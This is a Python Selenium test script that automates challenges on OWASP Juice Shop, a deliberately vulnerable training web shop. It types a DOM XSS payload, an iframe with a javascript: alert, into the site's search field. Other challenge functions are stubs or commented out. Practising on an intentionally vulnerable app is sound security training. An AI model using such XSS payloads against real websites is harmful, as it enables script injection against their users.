from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time


def test_button_click():
    '''
    This function is used to click button.
    '''
    global  wd
    button5 = wd.find_element(By.ID, 'mat-button-toggle-5-button')
    button5.click()
    button1 = wd.find_element(By.ID, 'mat-button-toggle-1-button')
    button1.click()


def test_dom_xss():
    '''
    This function is used for DOM XSS attack
    '''
    global  wd
    time.sleep(1)
    wd.find_element(By.ID, 'searchQuery').click()
    search_box = wd.find_element(By.ID, 'mat-input-0')
    search_box.send_keys('<iframe src="javascript:alert(`xss`)">')
    search_box.send_keys(Keys.ENTER)


def solve_popup_window():
    '''
    This function is used to deal with pop up windows
    '''
    global wd
    wd.find_element(By.CSS_SELECTOR, "[aria-label='Close Welcome Banner']").click()
    wd.find_element(By.LINK_TEXT, "Me want it!").click()


def open_sidemenu():
    '''
    This function is used to open the side menu
    '''
    global wd
    sidemenu = wd.find_element(By.CSS_SELECTOR, "[aria-label='Open Sidenav']")
    sidemenu.click()


def open_photowall():
    '''
    This function is used to open the photowall
    '''
    global wd
    photowall = wd.find_element(By.CSS_SELECTOR, "[aria-label = 'Go to photo wall']")
    photowall.click()


def test_encoding_hashkey():
    '''
    This function is used to encoding the hashkey
    '''
    global wd
    prev_code = wd.find_element(By.CLASS_NAME, "mat-elevation-z6").get_attribute("src")


def test_encoding_script():
    '''
    This function is used for challenge "Missing Encoding"
    '''


def get_webdriver():
    '''
    This function is used to get the webdriver
    :return: webdriver
    '''
    url = 'https://juice-shop.herokuapp.com/#/score-board'
    wd = webdriver.Chrome(service=Service(r'/Users/wangzhe/PycharmProjects/pythonProject/chromedriver'))
    wd.get(url)
    time.sleep(1)
    return wd


def test_selenium_func():
    global wd
    wd = get_webdriver()
    solve_popup_window()
    test_button_click()
    test_dom_xss()  # we need to click ok button to exit to perform the following task

    # open_sidemenu()
    # open_photowall()
    # time.sleep(1)
    # prev_code = wd.find_element(By.XPATH,"//img[contains(@src,'zat')]")
    # prev_src = prev_code.get_attribute("src")
    # modified_src = prev_src.replace("#","%23")
    # print(prev_code)
    # wd.execute_script("arguments[0].setAttribute(argument[1],arguments[2]);",
    # prev_code, "src", modified_src)
    # time.sleep(1)
    # wd.quit()
##chrome_driver = '/Users/wangzhe/PycharmProjects/pythonProject/chromedriver'
##browser = webdriver.Chrome(executable_path=chrome_driver)


